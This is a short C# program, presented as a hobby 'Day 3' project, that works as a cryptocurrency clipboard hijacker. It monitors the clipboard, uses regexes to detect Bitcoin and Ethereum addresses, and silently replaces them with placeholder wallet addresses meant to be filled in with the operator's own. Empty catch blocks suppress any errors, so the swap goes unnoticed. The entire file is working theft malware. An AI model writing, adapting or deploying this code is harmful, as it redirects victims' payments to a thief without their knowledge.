/*
 * 31 Days of XMAS projects (Day 3)
 * 
 * Clipboard Replacer by DavidTheTech
 * This will regex certain strings and replace then
*/

using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace ClipboardReplacer
{
    class Program
    {
        private static string ETHEREUM = "put eth wallet here";
        private static string BTC = "put btc wallet here";

        static void Main(string[] args)
        {
            try
            {
                ClipMon.OnClipboardChange += Checker;
                ClipMon.Start();
            }
            catch
            {
            }
        }

        private static void Checker(Clipform format, object data)
        {
            try
            {
                string text = Clipboard.GetText();
                /*old regex (^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}?[\\d\\- ])|(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34})$
                 * Wouldn't work for addresses beginning with bc1
                 * removed (1|3) and it seems to work
                 * not the best solution breaks when the address contains anything other than the address alone
                */

                Regex BTCRegex = new Regex("(^(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}?[\\d\\- ])|(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34})$");
                Regex ETHRegex = new Regex("(^0x[A-Za-z0-9]{40,40}?[\\d\\- ])|(^0x[A-Za-z0-9]{40,40})$");
                
                if (BTC != null && BTCRegex.IsMatch(text))
                {
                    Clipboard.SetText(BTC);
                }
                if (ETHEREUM != null && ETHRegex.IsMatch(text))
                {
                    Clipboard.SetText(ETHEREUM);
                }
            }
            catch
            {
            }
        }
    }
}
